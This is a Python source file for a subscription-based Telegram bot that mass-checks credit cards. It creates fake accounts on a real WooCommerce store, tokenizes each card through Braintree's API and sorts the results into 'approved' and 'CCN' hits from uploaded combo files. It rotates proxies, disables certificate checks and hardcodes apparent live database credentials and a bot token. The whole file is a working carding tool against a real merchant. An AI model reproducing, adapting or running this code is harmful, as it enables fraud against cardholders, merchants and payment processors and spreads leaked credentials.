import asyncio
import logging
import os
from datetime import datetime, timedelta
import random
import string
import time
import aiohttp
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import motor.motor_asyncio
from bs4 import BeautifulSoup
import re
import base64
import user_agent
from collections import defaultdict, deque
import ssl

# Enable logging
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# MongoDB setup
client = motor.motor_asyncio.AsyncIOMotorClient(os.getenv('MONGODB_URI', 'mongodb+srv://ElectraOp:BGMI272@cluster0.1jmwb.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0'))
db = client['fn_mass_checker']
users_collection = db['users']
keys_collection = db['keys']

# Bot token
TOKEN = os.getenv('TELEGRAM_BOT_TOKEN', '7748515975:AAHyGpFl4HXLLud45VS4v4vMkLfOiA6YNSs')
OWNER_ID = 7593550190  # Replace with your Telegram ID

# Proxy settings
PROXY = False
try:
    with open('proxies.txt', 'r') as f:
        PROXY_LIST = [line.strip() for line in f.readlines() if line.strip()]
except FileNotFoundError:
    PROXY_LIST = []
    if PROXY:
        logger.error("proxies.txt not found. Please provide a valid proxies.txt file.")
user = user_agent.generate_user_agent()

# Create a custom SSL context to bypass verification
ssl_context = ssl.create_default_context()
ssl_context.check_hostname = False
ssl_context.verify_mode = ssl.CERT_NONE

# Tiers
TIERS = {'Gold': 500, 'Platinum': 1000, 'Owner': 3000}

# Task management
check_queue = asyncio.Queue()  # Global queue for single checks
active_single_tasks = set()  # Active single check tasks
user_queues = defaultdict(deque)  # Per-user queues for bulk checks
user_active_tasks = defaultdict(set)  # Per-user active bulk tasks
user_cooldowns = {}  # Per-user cooldown timestamps
bulk_progress = {}  # Track bulk check progress
stop_checking = {}  # Track stop requests per user
COOLDOWN_SECONDS = 70
MAX_CONCURRENT_PER_USER = 3
MAX_CONCURRENT_SINGLE = 3

async def get_user(user_id):
    user = await users_collection.find_one({'user_id': user_id})
    return user

async def update_user(user_id, data):
    await users_collection.update_one({'user_id': user_id}, {'$set': data}, upsert=True)

async def delete_user_subscription(user_id):
    await users_collection.update_one(
        {'user_id': user_id},
        {'$unset': {'tier': "", 'expiration': "", 'cc_limit': "", 'checked': ""}}
    )

async def generate_key(tier, duration_days):
    key = f"FN-B3-{''.join(random.choices(string.ascii_uppercase + string.digits, k=6))}-{''.join(random.choices(string.ascii_uppercase + string.digits, k=6))}"
    await keys_collection.insert_one({'key': key, 'tier': tier, 'duration_days': duration_days, 'redeemed': False})
    return key

async def redeem_key(user_id, key):
    key_data = await keys_collection.find_one({'key': key, 'redeemed': False})
    if key_data:
        tier = key_data['tier']
        duration_days = key_data['duration_days']
        expiration = datetime.now() + timedelta(days=duration_days)
        await update_user(user_id, {'tier': tier, 'expiration': expiration, 'cc_limit': TIERS[tier], 'checked': 0})
        await keys_collection.update_one({'key': key}, {'$set': {'redeemed': True}})
        return tier, duration_days
    return None

def generate_full_name():
    first = ["Ahmed", "Mohamed", "Fatima", "Zainab", "Sarah"]
    last = ["Khalil", "Abdullah", "Smith", "Johnson", "Williams"]
    return random.choice(first), random.choice(last)

def generate_address():
    cities = ["London", "Manchester"]
    streets = ["Baker St", "Oxford St"]
    zips = ["SW1A 1AA", "M1 1AE"]
    city = random.choice(cities)
    return city, "England", f"{random.randint(1, 999)} {random.choice(streets)}", random.choice(zips)

def generate_email():
    return ''.join(random.choices(string.ascii_lowercase, k=10)) + "@gmail.com"

def generate_username():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=15))

def generate_phone():
    return "303" + ''.join(random.choices(string.digits, k=7))

def generate_code(length=32):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=32))

async def get_bin_details(bin_number):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(f"https://bins.antipublic.cc/bins/{bin_number}") as response:
                if response.status == 200:
                    data = await response.json()
                    bank = data.get('bank', 'Unknown')
                    card_type = data.get('brand', 'Unknown').capitalize()
                    card_level = data.get('level', 'Unknown')
                    card_type_category = data.get('type', 'Unknown')
                    country_name = data.get('country_name', '')
                    country_flag = data.get('country_flag', '')
                    return bank, card_type, card_level, card_type_category, country_name, country_flag
                else:
                    return "Unknown", "Unknown", "Unknown", "Unknown", "Unknown", ""
    except aiohttp.ClientError as e:
        logger.error(f"Error fetching BIN details: {e}")
        return "Unknown", "Unknown", "Unknown", "Unknown", "Unknown", ""

async def test_proxy(proxy_url):
    try:
        async with aiohttp.ClientSession() as session:
            async with session.get(
                "https://www.google.com",
                proxy=proxy_url,
                timeout=5,
                headers={'user-agent': user},
                ssl=ssl_context
            ) as response:
                return response.status == 200
    except (aiohttp.ClientError, asyncio.TimeoutError):
        return False

async def check_cc(cc_details):
    cc, mes, ano, cvv = cc_details.split('|')
    if len(mes) == 1: mes = f'0{mes}'
    if not ano.startswith('20'): ano = f'20{ano}'
    full = f"{cc}|{mes}|{ano}|{cvv}"

    bin_number = cc[:6]
    issuer, card_type, card_level, card_type_category, country_name, country_flag = await get_bin_details(bin_number)

    start_time = time.time()
    first_name, last_name = generate_full_name()
    city, state, street_address, zip_code = generate_address()
    acc = generate_email()
    username = generate_username()
    num = generate_phone()

    headers = {'user-agent': user}
    proxy_status = "None"
    proxy_url = None
    if PROXY and PROXY_LIST:
        proxy_url = random.choice(PROXY_LIST)
        is_proxy_alive = await test_proxy(proxy_url)
        proxy_status = "Live✅" if is_proxy_alive else "Dead❌"
    proxies = {'http': proxy_url, 'https': proxy_url} if proxy_url and is_proxy_alive else None

    try:
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=ssl_context)) as session:
            async with session.get('https://www.bebebrands.com/my-account/', headers=headers, proxy=proxies['http'] if proxies else None) as r:
                text = await r.text()
                reg = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', text).group(1)

            data = {
                'username': username, 'email': acc, 'password': 'SandeshData@123',
                'woocommerce-register-nonce': reg, '_wp_http_referer': '/my-account/', 'register': 'Register'
            }
            async with session.post('https://www.bebebrands.com/my-account/', headers=headers, data=data, proxy=proxies['http'] if proxies else None) as r:
                pass

            async with session.get('https://www.bebebrands.com/my-account/edit-address/billing/', headers=headers, proxy=proxies['http'] if proxies else None) as r:
                text = await r.text()
                address_nonce = re.search(r'name="woocommerce-edit-address-nonce" value="(.*?)"', text).group(1)

            data = {
                'billing_first_name': first_name, 
                'billing_last_name': last_name, 
                'billing_country': 'GB',
                'billing_address_1': street_address, 
                'billing_city': city, 
                'billing_postcode': zip_code,
                'billing_phone': num, 
                'email': acc, 
                'save_address': 'Save address',
                'woocommerce-edit-address-nonce': address_nonce,
                '_wp_http_referer': '/my-account/edit-address/billing/', 
                'action': 'edit_address'
            }
            async with session.post('https://www.bebebrands.com/my-account/edit-address/billing/', headers=headers, data=data, proxy=proxies['http'] if proxies else None) as r:
                pass

            async with session.get('https://www.bebebrands.com/my-account/add-payment-method/', headers=headers, proxy=proxies['http'] if proxies else None) as r:
                text = await r.text()
                add_nonce = re.search(r'name="woocommerce-add-payment-method-nonce" value="(.*?)"', text).group(1)
                client_nonce = re.search(r'client_token_nonce":"([^"]+)"', text).group(1)

            data = {
                'action': 'wc_braintree_credit_card_get_client_token', 'nonce': client_nonce
            }
            async with session.post('https://www.bebebrands.com/wp-admin/admin-ajax.php', headers=headers, data=data, proxy=proxies['http'] if proxies else None) as r:
                token_resp = await r.json()
                enc = token_resp['data']
                dec = base64.b64decode(enc).decode('utf-8')
                au = re.search(r'"authorizationFingerprint":"(.*?)"', dec).group(1)

            tokenize_headers = {
                'authorization': f'Bearer {au}', 'braintree-version': '2018-05-10', 'content-type': 'application/json',
                'origin': 'https://assets.braintreegateway.com', 'referer': 'https://assets.braintreegateway.com/', 'user-agent': user
            }
            json_data = {
                'clientSdkMetadata': {'source': 'client', 'integration': 'custom', 'sessionId': generate_code(36)},
                'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }',
                'variables': {'input': {'creditCard': {'number': cc, 'expirationMonth': mes, 'expirationYear': ano, 'cvv': cvv}, 'options': {'validate': False}}},
                'operationName': 'TokenizeCreditCard'
            }
            async with session.post('https://payments.braintree-api.com/graphql', headers=tokenize_headers, json=json_data, proxy=proxies['http'] if proxies else None) as r:
                tok = (await r.json())['data']['tokenizeCreditCard']['token']

            headers.update({
                'authority': 'www.bebebrands.com', 'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'content-type': 'application/x-www-form-urlencoded', 'origin': 'https://www.bebebrands.com',
                'referer': 'https://www.bebebrands.com/my-account/add-payment-method/'
            })
            data = [
                ('payment_method', 'braintree_credit_card'), ('wc-braintree-credit-card-card-type', 'master-card'),
                ('wc_braintree_credit_card_payment_nonce', tok), ('wc_braintree_device_data', '{"correlation_id":"ca769b8abef6d39b5073a87024953791"}'),
                ('wc-braintree-credit-card-tokenize-payment-method', 'true'), ('woocommerce-add-payment-method-nonce', add_nonce),
                ('_wp_http_referer', '/my-account/add-payment-method/'), ('woocommerce_add_payment_method', '1')
            ]
            async with session.post('https://www.bebebrands.com/my-account/add-payment-method/', headers=headers, data=data, proxy=proxies['http'] if proxies else None) as response:
                text = await response.text()
                soup = BeautifulSoup(text, 'html.parser')
                error_message = soup.select_one('.woocommerce-error .message-container')
                msg = error_message.text.strip() if error_message else "Unknown error"

        time_taken = time.time() - start_time
        result = {
            'card': full,
            'message': msg,
            'time_taken': time_taken,
            'proxy_status': proxy_status,
            'issuer': issuer,
            'card_type': card_type,
            'card_level': card_level,
            'card_type_category': card_type_category,
            'country_name': country_name,
            'country_flag': country_flag
        }

        if any(x in text for x in ['Nice! New payment method added', 'Insufficient funds', 'Payment method successfully added.', 'Duplicate card exists in the vault.']):
            result['status'] = 'approved'
        elif 'Card Issuer Declined CVV' in text:
            result['status'] = 'ccn'
        else:
            result['status'] = 'declined'

        return result
    except aiohttp.ClientSSLError as ssl_err:
        return {
            'card': full,
            'status': 'error',
            'message': f"SSL Error: {str(ssl_err)}",
            'time_taken': time.time() - start_time,
            'proxy_status': proxy_status,
            'issuer': issuer,
            'card_type': card_type,
            'card_level': card_level,
            'card_type_category': card_type_category,
            'country_name': 'Unknown',
            'country_flag': ''
        }
    except aiohttp.ClientError as e:
        return {
            'card': full,
            'status': 'error',
            'message': str(e),
            'time_taken': time.time() - start_time,
            'proxy_status': proxy_status,
            'issuer': issuer,
            'card_type': card_type,
            'card_level': card_level,
            'card_type_category': card_type_category,
            'country_name': 'Unknown',
            'country_flag': ''
        }

async def process_single_checks():
    while True:
        # Clean up completed tasks
        done_tasks = [task for task in active_single_tasks if task.done()]
        for task in done_tasks:
            active_single_tasks.remove(task)
        # Process new single check tasks
        while len(active_single_tasks) < MAX_CONCURRENT_SINGLE and not check_queue.empty():
            user_id, cc_details, update, context, is_bulk, bulk_id = await check_queue.get()
            if stop_checking.get(user_id, False):
                continue
            task = asyncio.create_task(single_check(user_id, cc_details, update, context, is_bulk, bulk_id))
            active_single_tasks.add(task)
        await asyncio.sleep(1)

async def process_user_checks():
    while True:
        for user_id in list(user_queues):
            if stop_checking.get(user_id, False):
                user_queues[user_id].clear()
                continue

            # Check if user is on cooldown
            if user_id in user_cooldowns:
                if time.time() < user_cooldowns[user_id]:
                    continue
                else:
                    del user_cooldowns[user_id]

            # Process up to MAX_CONCURRENT_PER_USER bulk tasks
            queue = user_queues[user_id]
            active_tasks = user_active_tasks[user_id]
            # Clean up completed tasks
            done_tasks = [task for task in active_tasks if task.done()]
            for task in done_tasks:
                active_tasks.remove(task)

            while len(active_tasks) < MAX_CONCURRENT_PER_USER and queue:
                item = queue.popleft()
                task = asyncio.create_task(single_check(*item))
                active_tasks.add(task)

            # Set cooldown if exactly MAX_CONCURRENT_PER_USER tasks were started
            if len(active_tasks) == MAX_CONCURRENT_PER_USER and len(done_tasks) == 0:
                user_cooldowns[user_id] = time.time() + COOLDOWN_SECONDS

        await asyncio.sleep(1)

async def single_check(user_id, cc_details, update, context, is_bulk, bulk_id):
    if is_bulk and bulk_id in bulk_progress:
        async with bulk_progress[bulk_id]['lock']:
            if bulk_progress[bulk_id]['stopped']:
                bulk_progress[bulk_id]['pending'] -= 1
                if bulk_progress[bulk_id]['pending'] == 0:
                    await send_final_message(user_id, bulk_id, context)
                return

    user = await get_user(user_id)
    checking_msg = None
    if not is_bulk:
        checking_msg = await update.message.reply_text("Checking Your Cc Please Wait..")
    result = await check_cc(cc_details)
    if checking_msg:
        await checking_msg.delete()

    card_info = f"{result['card_type']} {{ {result['card_level']} }} {{ {result['card_type_category']} }}"
    issuer = result['issuer']
    country_display = f"{result['country_name']} {result['country_flag']}" if result['country_flag'] else result['country_name']
    checked_by = f"<a href='tg://user?id={user_id}'>{user_id}</a>"
    tier = user['tier'] if user else "None"

    if result['status'] == 'approved':
        msg = (f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝 ✅\n\n"
               f"[ϟ]𝗖𝗮𝗿𝗱 -» <code>{result['card']}</code>\n"
               f"[ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Braintree Auth\n"
               f"[ϟ]R𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» Approved ✅\n\n"
               f"[ϟ]𝗜𝗻𝗳𝗼 -» {card_info}\n"
               f"[ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {issuer} 🏛\n"
               f"[ϟ]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {country_display}\n\n"
               f"[⌬]𝗧𝗶𝗺𝗲 -» {result['time_taken']:.2f} seconds\n"
               f"[⌬]𝗣𝗿𝗼𝘅𝘆 -» {result['proxy_status']}\n"
               f"[⌬]𝗖𝗵𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 -» {checked_by} {tier}\n"
               f"[み]𝗕𝗼𝘁 -» <a href='tg://user?id=8009942983'>𝙁𝙉 𝘽3 𝘼𝙐𝙏𝙃</a>")
        if is_bulk:
            await context.bot.send_message(chat_id=update.message.chat_id, text=msg, parse_mode='HTML')
        else:
            await update.message.reply_text(msg, parse_mode='HTML')
    elif result['status'] == 'declined' and not is_bulk:
        msg = (f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌\n\n"
               f"[ϟ]𝗖𝗮𝗿𝗱 -» <code>{result['card']}</code>\n"
               f"[ϟ]𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» Braintree Auth\n"
               f"[ϟ]𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» {result['message']}\n\n"
               f"[ϟ]𝗜𝗻𝗳𝗼 -» {card_info}\n"
               f"[ϟ]𝗜𝘀𝘀𝘂𝗲𝗿 -» {issuer} 🏛\n"
               f"[ϟ]𝗖𝗼𝘂𝗻𝘁𝗿𝘆 -» {country_display}\n\n"
               f"[⌬]𝗧𝗶𝗺𝗲 -» {result['time_taken']:.2f} seconds\n"
               f"[⌬]𝗣𝗿𝗼𝘅𝘆 -» {result['proxy_status']}\n"
               f"[⌬]𝗖𝗵𝐞𝐜𝐤𝐞𝐝 𝐁𝐲 -» {checked_by} {tier}\n"
               f"[み]𝗕𝗼𝘁 -» <a href='tg://user?id=8009942983'>𝙁𝙉 𝘽3 𝘼𝙐𝙏𝙃</a>")
        if '2010: Card Issuer Declined CVV' in result['message']:
            msg = msg.replace("𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝 ❌", "𝐂𝐂𝐍 ✅")
        await update.message.reply_text(msg, parse_mode='HTML')

    if is_bulk and bulk_id in bulk_progress:
        progress = bulk_progress[bulk_id]
        async with progress['lock']:
            last_response = result['message']  # Always set last_response
            if result['status'] == 'approved':
                progress['approved'] += 1
                progress['hits'].append(result['card'])
            elif result['status'] in ['declined', 'ccn']:
                progress['declined'] += 1
                if result['status'] == 'ccn':
                    progress['hits'].append(result['card'])
            progress['pending'] -= 1

            approved = progress['approved']
            declined = progress['declined']
            total = progress['total']
            max_response_length = 64 - len("Response💎: ")
            last_response_display = last_response[:max_response_length - 3] + "..." if len(last_response) > max_response_length else last_response

            progress_text = (
                f"🔎 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 𝐂𝐚𝐫𝐝𝐬...\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"[み] 𝐁𝐨𝐭: @FN_B3_AUTH"
            )
            keyboard = [
                [InlineKeyboardButton(f"𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝✅: {approved}", callback_data='view_approved')],
                [InlineKeyboardButton(f"𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝❌: {declined}", callback_data='view_declined')],
                [InlineKeyboardButton(f"𝐓𝐨𝐭𝐚𝐥💳: {total}", callback_data='view_total')],
                [InlineKeyboardButton("𝐒𝐭𝐨𝐩🔴", callback_data=f'stop_checking_{bulk_id}')],
                [InlineKeyboardButton(f"𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞💎: {last_response_display}", callback_data='view_response')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await progress['msg'].edit_text(progress_text, reply_markup=reply_markup, parse_mode='HTML')

            if progress['pending'] == 0 and not progress['completed']:
                progress['completed'] = True
                await send_final_message(user_id, bulk_id, context)

    if user:
        await update_user(user_id, {'checked': user.get('checked', 0) + 1})

async def send_final_message(user_id, bulk_id, context):
    progress = bulk_progress[bulk_id]
    approved = progress['approved']
    declined = progress['declined']
    total = progress['total']
    hits = progress['hits']
    duration = time.time() - progress['start_time']
    speed = total / duration if duration > 0 else 0
    success_rate = (approved / total * 100) if total > 0 else 0

    context.user_data['approved'] = approved
    context.user_data['declined'] = declined
    context.user_data['total'] = total

    hit_file = f"fn-b3-hits-{random.randint(1000, 9999)}.txt"
    with open(hit_file, 'w') as f:
        f.write('\n'.join(hits))
    with open(hit_file, 'rb') as f:
        keyboard = [
            [InlineKeyboardButton(f"Approved✅: {approved}", callback_data='view_approved')],
            [InlineKeyboardButton(f"Declined❌: {declined}", callback_data='view_declined')],
            [InlineKeyboardButton(f"Total💳: {total}", callback_data='view_total')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await context.bot.send_document(
            chat_id=progress['msg'].chat_id,
            document=f,
            caption=(
                f"[⌬] 𝐅𝐍 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐇𝐈𝐓𝐒 😈⚡\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"[✪] 𝐀𝐩𝐩𝐫𝐨𝐯𝐞𝐝: {approved}\n"
                f"[❌] 𝐃𝐞𝐜𝐥𝐢𝐧𝐞𝐝: {declined}\n"
                f"[✪] 𝐂𝐡𝐞𝐜𝐤𝐞𝐝: {approved + declined}/{total}\n"
                f"[✪] 𝐓𝐨𝐭𝐚𝐥: {total}\n"
                f"[✪] 𝐃𝐮𝐫𝐚𝐭𝐢𝐨𝐧: {duration:.2f} seconds\n"
                f"[✪] 𝐀𝐯𝐠 𝐒𝐩𝐞𝐞𝐝: {speed:.2f} cards/sec\n"
                f"[✪] 𝐒𝐮𝐜𝐜𝐞𝐬𝐬 𝐑𝐚𝐭𝐞: {success_rate:.1f}%\n"
                f"━━━━━━━━━━━━━━━━━━━━━━\n"
                f"[み] 𝐃𝐞𝐯: <a href='tg://user?id=7593550190'>𓆰𝅃꯭᳚⚡!! ⏤‌𝐅ɴ x 𝐄ʟᴇᴄᴛʀᴀ𓆪𓆪⏤‌➤⃟🔥</a>"
            ),
            parse_mode='HTML',
            reply_markup=reply_markup
        )
    os.remove(hit_file)
    del bulk_progress[bulk_id]
    user_queues[user_id].clear()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("Upload Files", callback_data='upload_files')],
        [InlineKeyboardButton("Cancel Check", callback_data='cancel_check')],
        [InlineKeyboardButton("Help", callback_data='help')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(
        "🔥 𝐖𝐞𝐥𝐜𝐨𝐦𝐞 𝐓𝐨 𝐅𝐍 𝐌𝐀𝐒𝐒 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 𝐁𝐎𝐓!\n\n"
        "🔥 𝐔𝐬𝐞 /chk 𝐓𝐨 𝐂𝐡𝐞𝐜𝐤 𝐒𝐢𝐧𝐠𝐥𝐞 𝐂𝐂\n\n"
        "🔥 𝐔𝐬𝐞 /stop 𝐓𝐨 𝐒𝐭𝐨𝐩 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠\n\n"
        "📁 𝐒𝐞𝐧𝐝 𝐂𝐨𝐦𝐛𝐨 𝐅𝐢𝐥𝐞 𝐎𝐫 𝐄𝐥𝐬𝐞 𝐔𝐬𝐞 𝐁𝐮𝐭𝐭𝐨𝐧 𝐁𝐞𝐥𝐨𝐰:",
        reply_markup=reply_markup
    )

async def stop(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    stop_checking[user_id] = True
    user_queues[user_id].clear()
    for task in user_active_tasks[user_id]:
        task.cancel()
    user_active_tasks[user_id].clear()
    if user_id in user_cooldowns:
        del user_cooldowns[user_id]
    await update.message.reply_text("Checking Stopped 🔴")

async def chk(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    user = await get_user(user_id)
    if not user or user['expiration'] < datetime.now():
        await update.message.reply_text("You don't have an active subscription. Please redeem a key with /redeem <key>.")
        return

    cc_details = ' '.join(context.args)
    if not cc_details or len(cc_details.split('|')) != 4:
        await update.message.reply_text("Please provide CC details in the format: /chk 4242424242424242|02|27|042")
        return

    await check_queue.put((user_id, cc_details, update, context, False, None))

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = query.from_user.id

    if query.data == 'upload_files':
        await query.message.reply_text("Send Your Txt File For Checking")
    elif query.data == 'cancel_check':
        stop_checking[user_id] = True
        user_queues[user_id].clear()
        for task in user_active_tasks[user_id]:
            task.cancel()
        user_active_tasks[user_id].clear()
        if user_id in user_cooldowns:
            del user_cooldowns[user_id]
        await query.message.reply_text("Checking Cancelled ❌")
    elif query.data == 'help':
        await query.message.reply_text("Use /chk to check a single CC or upload a text file for bulk checking.")
    elif query.data == 'view_approved':
        await query.message.reply_text(f"Approved cards: {context.user_data.get('approved', 0)}")
    elif query.data == 'view_declined':
        await query.message.reply_text(f"Declined cards: {context.user_data.get('declined', 0)}")
    elif query.data == 'view_total':
        await query.message.reply_text(f"Total cards: {context.user_data.get('total', 0)}")
    elif query.data == 'view_response':
        pass
    elif query.data.startswith('stop_checking_'):
        bulk_id = query.data.split('_')[2]
        if bulk_id in bulk_progress:
            async with bulk_progress[bulk_id]['lock']:
                bulk_progress[bulk_id]['stopped'] = True
            stop_checking[user_id] = True
            user_queues[user_id].clear()
            for task in user_active_tasks[user_id]:
                task.cancel()
            user_active_tasks[user_id].clear()
            if user_id in user_cooldowns:
                del user_cooldowns[user_id]
            await query.message.reply_text("Checking Stopped 🔴")

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    user = await get_user(user_id)
    if not user or user['expiration'] < datetime.now():
        await update.message.reply_text("You don't have an active subscription. Please redeem a key with /redeem <key>.")
        return

    file = await update.message.document.get_file()
    file_path = await file.download_to_drive()
    with open(file_path, 'r') as f:
        cc_list = [line.strip() for line in f.readlines() if len(line.strip().split('|')) == 4]

    if len(cc_list) > user['cc_limit']:
        await update.message.reply_text(f"Your tier ({user['tier']}) allows checking up to {user['cc_limit']} CCs at a time.")
        return

    stop_checking[user_id] = False
    bulk_id = str(random.randint(100000, 999999))
    total = len(cc_list)
    msg = await update.message.reply_text("🔎 𝐂𝐡𝐞𝐜𝐤𝐢𝐧𝐠 𝐂𝐚𝐫𝐝𝐬...")
    bulk_progress[bulk_id] = {
        'total': total,
        'approved': 0,
        'declined': 0,
        'hits': [],
        'msg': msg,
        'lock': asyncio.Lock(),
        'completed': False,
        'pending': total,
        'stopped': False,
        'start_time': time.time()
    }
    for cc_details in cc_list:
        user_queues[user_id].append((user_id, cc_details, update, context, True, bulk_id))

async def genkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.from_user.id != OWNER_ID:
        await update.message.reply_text("You are not authorized to use this command.")
        return

    try:
        tier, duration, quantity = context.args
        duration = int(duration.replace('d', ''))
        quantity = int(quantity)
        if tier not in TIERS:
            raise ValueError
    except:
        await update.message.reply_text("Usage: /genkey <tier> <duration> <quantity>\nExample: /genkey Gold 1d 5")
        return

    keys = [await generate_key(tier, duration) for _ in range(quantity)]
    await update.message.reply_text(
        f"𝐆𝐢𝐟𝐭𝐜𝐨𝐝𝐞 𝐆𝐞𝐧𝐞𝐫𝐚𝐭𝐞𝐝 ✅\n𝐀𝐦𝐨𝐮𝐧𝐭: {quantity}\n\n" +
        '\n'.join([f"➔ {key}\n𝐕𝐚𝐥𝐮𝐞: {tier} {duration} days" for key in keys]) +
        "\n\n𝐅𝐨𝐫 𝐑𝐞𝐝𝐞𝐞𝐦𝐩𝐭𝐢𝐨𝐧\n𝐓𝐲𝐩𝐞 /redeem {key}"
    )

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    try:
        key = context.args[0]
    except:
        await update.message.reply_text("Usage: /redeem <key>")
        return

    result = await redeem_key(user_id, key)
    if result:
        tier, duration_days = result
        await update.message.reply_text(
            f"𝐂𝐨𝐧𝐠𝐫𝐚𝐭𝐮𝐥𝐚𝐭𝐢𝐨𝐧𝐬 🎉\n\n𝐘𝐨𝐮𝐫 𝐒𝐮𝐛𝐬𝐜𝐫𝐢𝐩𝐭𝐢𝐨𝐧 𝐈𝐬 𝐧𝐨𝐰 𝐀𝐜𝐭𝐢𝐯𝐚𝐭𝐞𝐝 ✅\n\n𝐕𝐚𝐥𝐮𝐞: {tier} {duration_days} days\n\n𝐓𝐡𝐚𝐧𝐤𝐘𝐨𝐮"
        )
    else:
        await update.message.reply_text("Invalid or already redeemed key.")

async def delkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.from_user.id != OWNER_ID:
        await update.message.reply_text("You are not authorized to use this command.")
        return

    try:
        user_id = int(context.args[0])
    except (IndexError, ValueError):
        await update.message.reply_text("Usage: /delkey <user_id>\nExample: /delkey 123456789")
        return

    user = await get_user(user_id)
    if not user or 'tier' not in user:
        await update.message.reply_text(f"No active subscription found for user ID {user_id}.")
        return

    await delete_user_subscription(user_id)
    await update.message.reply_text(f"Subscription for user ID {user_id} has been deleted successfully ✅")

async def broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.message.from_user.id != OWNER_ID:
        await update.message.reply_text("You are not authorized to use this command.")
        return

    message = ' '.join(context.args)
    users = await users_collection.find().to_list(length=None)
    for user in users:
        try:
            await context.bot.send_message(chat_id=user['user_id'], text=message)
        except:
            pass
    await update.message.reply_text("Broadcast sent to all users.")

def main():
    application = Application.builder().token(TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("stop", stop))
    application.add_handler(CommandHandler("chk", chk))
    application.add_handler(CommandHandler("genkey", genkey))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("delkey", delkey))
    application.add_handler(CommandHandler("broadcast", broadcast))
    application.add_handler(MessageHandler(filters.Document.ALL, handle_file))
    application.add_handler(CallbackQueryHandler(button_callback))
    asyncio.ensure_future(process_single_checks())
    asyncio.ensure_future(process_user_checks())
    application.run_polling()

if __name__ == '__main__':
    main()
